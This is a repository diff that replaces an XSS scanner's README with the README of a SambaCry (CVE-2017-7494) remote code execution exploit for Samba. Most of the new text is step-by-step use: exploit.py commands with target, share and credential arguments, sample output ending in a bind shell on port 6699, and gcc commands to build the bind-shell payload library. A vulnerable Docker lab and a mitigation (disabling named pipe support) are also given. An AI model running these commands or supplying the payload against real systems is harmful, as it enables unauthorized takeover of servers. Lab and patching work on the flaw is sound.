@@ -1,66 +1,124 @@
-# XSSSNIPER
+# SambaCry RCE exploit for Samba 4.5.9
 
-xsssniper is an handy xss discovery tool with mass scanning functionalities.
+[![Docker Pulls](https://img.shields.io/docker/pulls/vulnerables/cve-2017-7494.svg?style=plastic)](https://hub.docker.com/r/vulnerables/cve-2017-7494/)
+![License](https://img.shields.io/badge/License-GPL-blue.svg?style=plastic)
 
-## Usage:
+Samba is a free software re-implementation of the SMB/CIFS networking protocol. Samba provides file and print services for various Microsoft Windows clients and can integrate with a Microsoft Windows Server domain, either as a Domain Controller (DC) or as a domain member. As of version 4, it supports Active Directory and Microsoft Windows NT domains.
 
-    Usage: xsssniper.py [options]
+Samba in **4.5.9** version and before that is vulnerable to a remote code execution vulnerability named **SambaCry**. CVE-2017-7494 allows remote authenticated users to upload a shared library to a writable shared folder, and perform code execution attacks to take control of servers that host vulnerable Samba services.
 
-    Options:
-      -h, --help            show this help message and exit
-      -u URL, --url=URL     target URL
-      --post                try a post request to target url
-      --data=POST_DATA      post data to use
-      --threads=THREADS     number of threads
-      --http-proxy=HTTP_PROXY
-                            scan behind given proxy (format: 127.0.0.1:80)
-      --tor                 scan behind default Tor
-      --crawl               crawl target url for other links to test
-      --forms               crawl target url looking for forms to test
-      --user-agent=USER_AGENT
-                            provide an user agent
-      --random-agent        perform scan with random user agents
-      --cookie=COOKIE       use a cookie to perform scans
-      --dom                 basic heuristic to detect dom xss
+Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 does not restrict the file path when using Windows named pipes, which allows remote authenticated users to upload a shared library to a writable shared folder, and execute arbitrary code via a crafted named pipe.
 
 
-## Examples:
 
-Scanning a single url with GET params:
+### Exploit
 
-    $ python xsssniper.py -u "http://target.com/index.php?page=test"
+![sambacry](sambacry.gif)
 
-Scanning a single url with POST params:
+To properly run this exploit you will need a patched version of `impacket` python library and the other dependencies in requirements file. To install all of them, please run
 
-    $ python xsssniper.py -u "http://target.com/index.php" --post --data=POST_DATA
+```
+pip install -r requirements.txt
+```
 
-Crawl a single url looking for forms to scan:
+If you run Python3, you need to run this software in a virtual environment. Please follow the steps:
 
-    $ python xsssniper.py -u "http://target.com" --forms
+```
+pip install virtualenv
+virtualenv -p /usr/bin/python2.7 venv # or wherever your python2.7 resides
+source venv/bin/activate.sh
+```
 
-Mass scan an entire website:
+After that you can run it as the following:
 
-    $ python xsssniper.py -u "http://target.com" --crawl
+```
+./exploit.py -t <target> -e libbindshell-samba.so \
+             -s <share> -r <location>/libbindshell-samba.so \
+             -u <user> -p <password> -P 6699
+```
 
-Mass scan an entire website forms included:
+For example, if you want to exploit the vulnerable environment with within this repository, run
 
-    $ python xsssniper.py -u "http://target.com" --crawl --forms
+```
+./exploit.py -t localhost -e libbindshell-samba.so \
+             -s data -r /data/libbindshell-samba.so \
+             -u sambacry -p nosambanocry -P 6699
+```
 
-Analyze target page javascripts (embedded and linked) to search for common sinks and sources:
+And you will get the following output
 
-    $ python xsssniper.py -u "http://target.com" --dom
+```
+./exploit.py -t localhost -e libbindshell-samba.so \
+             -s data -r /data/libbindshell-samba.so \
+             -u sambacry -p nosambanocry -P 6699
+[*] Starting the exploit
+[+] Authentication ok, we are in !
+[+] Preparing the exploit
+[+] Exploit trigger running in background, checking our shell
+[+] Connecting to 10.1.1.5 at 6699
+[+] Veryfying your shell...
+Linux 7a4b8023575a 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1+deb8u1 (2017-02-22) x86_64 GNU/Linux
+>>
+```
 
-## Thanks:
+Exploit's arguments explained:
 
-* Miroslav Stamparm
-* Claudio Telmon
+```
+usage: exploit.py [-h] -t TARGET -e EXECUTABLE -s REMOTESHARE -r REMOTEPATH
+                  [-u USER] [-p PASSWORD] [-P REMOTESHELLPORT]
+```
 
-## License
+* `-t` or `—target` - Set the remote host to attack.
+* `-e` or `—executable` - Set the path on your **local system** where the lib that you want to load is located.
+* `-s` or `—remoteshare` - Remote share where the file will be copied.
+* `-r` or `—remotepath` - Where the file is located on the **remote system**.
+* `-u` or `—user` - Username to log in with.
+* `-p` or `—password` - Password to use to log in with.
+* `-P` or `—remoteshellport` - If you are using a bind shell payload, connect to the payload after the attack is executed.
 
-ISC License.
+### Vulnerable environment
 
- > Copyright (c) 2012, Gianluca Brindisi < g@brindi.si >
- >
- > Permission to use, copy, modify, and/or distribute this software for any purpose with or without fee is hereby granted, provided that the above copyright notice and this permission notice appear in all copies.
- >
- > THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
+To simulate this attack you can use a vulnerable docker image. If you have docker installed, just run
+
+```
+docker run --rm -it \
+       -p 137-139:137-139 \
+       -p 445:445 -p 6699:6699 \
+       vulnerables/cve-2017-7494
+```
+
+If you want to access, use the following credentials.
+
+* User: `sambacry`
+* Password: `nosambanocry`
+
+
+
+### Alternative payloads
+
+You can find one example of binding shell payload for this exploit in `bindshell-samba.c` file. Change it as you may find necessary. After that to generate a new binary, use:
+
+```
+gcc -c -fpic bindshell-samba.c
+gcc -shared -o libbindshell-samba.so bindshell-samba.o
+```
+
+### Afftected software
+
+Samba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4
+
+### Mitigation
+
+Add the parameter:
+
+```
+nt pipe support = no
+```
+
+to the `[global]` section of your smb.conf and restart smbd. This prevents clients from accessing any named pipe endpoints. Note this can disable some expected functionality for Windows clients.
+
+Also consider mounting the filesystem which is used by samba for its writable share using `noexec` option.
+
+### Disclaimer
+
+This or previous program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (opsxcq) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not opsxcq's responsibility.
